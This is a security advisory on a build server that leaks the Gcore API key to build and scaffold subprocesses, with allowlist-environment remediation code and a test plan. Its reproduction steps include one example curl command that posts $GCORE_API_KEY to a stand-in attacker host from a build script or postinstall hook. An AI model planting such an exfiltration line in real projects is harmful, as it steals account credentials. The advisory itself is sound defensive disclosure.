# SA-001 — Operator API key exposed to every build/scaffold subprocess

**Severity:** High
**Category:** Credential exposure / secrets management (CWE-200, CWE-522)
**Status:** Open
**Affected files:**
- `src/tools/local/workspace/compiler/jsBuild.ts:33`
- `src/tools/local/workspace/compiler/asBuild.ts:57`
- `src/tools/local/workspace/compiler/rustBuild.ts:80`
- `src/tools/local/scaffolding/scaffolds.ts:40` (`execAsync`), `:175` (`execFile`)

## Summary

Every subprocess this server spawns to build or scaffold code inherits the
**full parent environment**, which includes `GCORE_API_KEY` (and the legacy
`FASTEDGE_API_KEY`). Those subprocesses execute **untrusted code from the
workspace and the network**:

- `cargo build` runs the project's `build.rs` and any proc-macro crate at
  compile time — arbitrary Rust, with full env access.
- `npx fastedge-build` / `asc` run code from the project's `node_modules`.
- `create-fastedge-app@beta` + the `npm install` it triggers run **network-
  fetched** package lifecycle scripts (`postinstall`, etc.).

Any of that code can read `process.env.GCORE_API_KEY` and exfiltrate it. The
key is a Gcore account credential — leaking it is account compromise, far beyond
the blast radius of the build itself.

## Where it is

All four spawn sites pass the whole environment:

```ts
// jsBuild.ts / asBuild.ts / rustBuild.ts
spawn(cmd, args, { stdio: [...], cwd, env: { ...process.env } });
//                                      ^^^^^^^^^^^^^^^^^^^^^^ leaks GCORE_API_KEY

// scaffolds.ts
execFileAsync("npx", args, { cwd, env: process.env, ... });
```

`GCORE_API_KEY` is read in `src/server.ts:14` and is present in `process.env`
for the whole server lifetime, so it is in `{ ...process.env }` at every spawn.

## Reproduction

1. In a workspace project, add a `build.rs` (Rust) or `package.json` with a
   `postinstall`/`preinstall` script (JS) that does
   `curl -X POST https://attacker.example -d "$GCORE_API_KEY"` (or the JS
   equivalent reading `process.env.GCORE_API_KEY`).
2. Trigger `build-wasm` (Rust/AS/JS) or `scaffold-fastedge-project` against it.
3. The key leaves the container to the attacker's host.

## Impact

- **Confidentiality:** full Gcore API key disclosure to any code the build
  touches (first-party project code, transitive npm/cargo dependencies,
  proc-macros, lifecycle scripts).
- Realistic trigger: a developer builds a project with a compromised
  dependency. No targeting of this server is required — ordinary supply-chain
  compromise reaches the key.

## Remediation

Two layers are required. Layer 1 alone is **not** sufficient (see the caveat) —
do both.

### Layer 1 — stop putting the key in `process.env` at all

`server.ts:14` reads the key into a constant but leaves it in `process.env` for
the whole process lifetime, so it is in `{ ...process.env }` at every spawn *and*
readable by any same-UID child via `/proc/<server-pid>/environ`. After capturing
it, delete it from the ambient environment:

```ts
// src/server.ts — after reading the key into GCORE_API_KEY
const GCORE_API_KEY =
  process.env.GCORE_API_KEY || process.env.FASTEDGE_API_KEY || "";
delete process.env.GCORE_API_KEY;
delete process.env.FASTEDGE_API_KEY;
```

**Caution — this requires one companion change.** `api-client.ts:84` reads
`process.env.GCORE_API_KEY` *lazily* at call time, so deleting it from the env
will break API calls unless the captured key is threaded through instead.
`callGcoreApi` already accepts `opts.authHeader`; make the server pass the
captured key down to the API tools (the tool layer already receives
`gcoreApiKey` via `ToolOptions` — use that everywhere `callGcoreApi` currently
falls back to `process.env`). Verify no code path still relies on
`process.env.GCORE_API_KEY` before deleting it, or you will silently switch the
server to "No authorization provided". Run `pnpm run test:api` after.

### Layer 2 — pass a scrubbed env to subprocesses anyway (defense in depth)

Even with Layer 1, use an **allowlist** env for children so a *future* secret
added to the environment isn't leaked by default:

```ts
// src/utils/index.ts (or a new src/utils/env.ts)
const PASSTHROUGH_ENV = [
  "PATH", "HOME", "LANG", "LC_ALL", "TERM", "CARGO_HOME", "RUSTUP_HOME",
  "WASI_SYSROOT", "npm_config_cache",
];

/** Minimal env for build/scaffold child processes — no ambient secrets. */
export function buildSubprocessEnv(): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = {};
  for (const k of PASSTHROUGH_ENV) if (process.env[k]) env[k] = process.env[k];
  // The Dockerfile sets per-target CC_*/CXX_* for native wasm builds — keep them.
  for (const k of Object.keys(process.env)) {
    if (/^(CC|CXX|CFLAGS|CXXFLAGS)_/.test(k) && process.env[k]) env[k] = process.env[k];
  }
  return env;
}
```

Replace `env: { ...process.env }` / `env: process.env` with
`env: buildSubprocessEnv()` in `jsBuild.ts:33`, `asBuild.ts:57`,
`rustBuild.ts:80`, and both `scaffolds.ts` calls (line 40 `execAsync` currently
sets no `env` at all, so it inherits everything — add it there too).

> An allowlist is chosen over a denylist deliberately: a denylist that strips
> only `GCORE_API_KEY`/`FASTEDGE_API_KEY` (the naive fix) silently leaks the
> next secret someone adds to the environment. If the allowlist turns out to
> miss a var a build genuinely needs, the build fails loudly (easy to diagnose
> and add) rather than a secret leaking silently.

## Honest limitation

Neither layer is perfect isolation. Layer 1 removes the key from the parent
environment, which closes the `/proc/<pid>/environ` read *for the key*. But any
build that legitimately runs untrusted code (proc-macros, postinstall) executes
in the same trust domain as the tool that *does* hold the key elsewhere in
memory. True isolation would mean running builds in a separate sandbox/UID/
namespace with no path to the credential at all. Layers 1+2 are the pragmatic,
mechanically-applicable mitigation; call out sandboxing as the longer-term fix,
don't claim this "isolates" the key.

## Test

Add to `scripts/tests/`: stub `spawn`, call each compiler, assert the `env`
passed contains no `GCORE_API_KEY`/`FASTEDGE_API_KEY` (and, if you want to lock
Layer 1 in, assert `process.env.GCORE_API_KEY` is `undefined` after server
bootstrap). Fails if any site regresses.

## Notes

- Same trust boundary the shell-injection fixes (ICM-50655) hardened — that work
  removed the shell so build inputs can't inject commands; this is the
  complementary half: even with no injection, the build *legitimately* runs
  untrusted code, so the key must not be in its reach.
